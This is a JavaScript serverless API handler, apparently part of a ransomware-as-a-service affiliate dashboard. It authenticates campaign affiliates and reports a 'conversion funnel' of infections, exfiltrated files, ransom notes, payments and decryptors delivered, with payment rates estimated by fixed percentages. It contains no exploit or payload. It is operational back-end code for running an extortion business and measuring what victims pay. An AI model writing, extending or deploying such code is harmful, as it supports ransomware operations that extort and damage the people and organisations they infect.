// vercel-dashboard/api/affiliate/stats/funnel.js
// Affiliate conversion funnel statistics

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  const affiliateId = `aff_${auth.campaignId.replace('camp_', '')}`;

  try {
    const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];
    
    let infections = 0;
    let exfiltrations = 0;
    let ransomNotes = 0;
    let payments = 0;
    let decryptorsDelivered = 0;

    for (const cid of campaignIds) {
      const stats = await kv.hgetall(`campaign:${cid}:stats`) || {};
      infections += parseInt(stats.totalInfections || '0');
      exfiltrations += parseInt(stats.totalFiles || '0');
      // Ransom notes would be tracked separately
      ransomNotes += parseInt(stats.totalInfections || '0') * 0.8; // Estimate 80% drop rate
      
      // Payments and decryptors would come from payment tracking
      // For now, estimate based on conversion
      payments += parseInt(stats.totalInfections || '0') * 0.15; // 15% payment rate
      decryptorsDelivered += parseInt(stats.totalInfections || '0') * 0.12; // 12% delivery rate
    }

    const conversionRate = infections > 0 ? (payments / infections * 100).toFixed(1) : 0;

    return response.json({
      infections,
      exfiltrations,
      ransomNotes: Math.floor(ransomNotes),
      payments: Math.floor(payments),
      decryptorsDelivered: Math.floor(decryptorsDelivered),
      conversionRate: parseFloat(conversionRate),
    });
  } catch (error) {
    console.error('Affiliate funnel stats error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}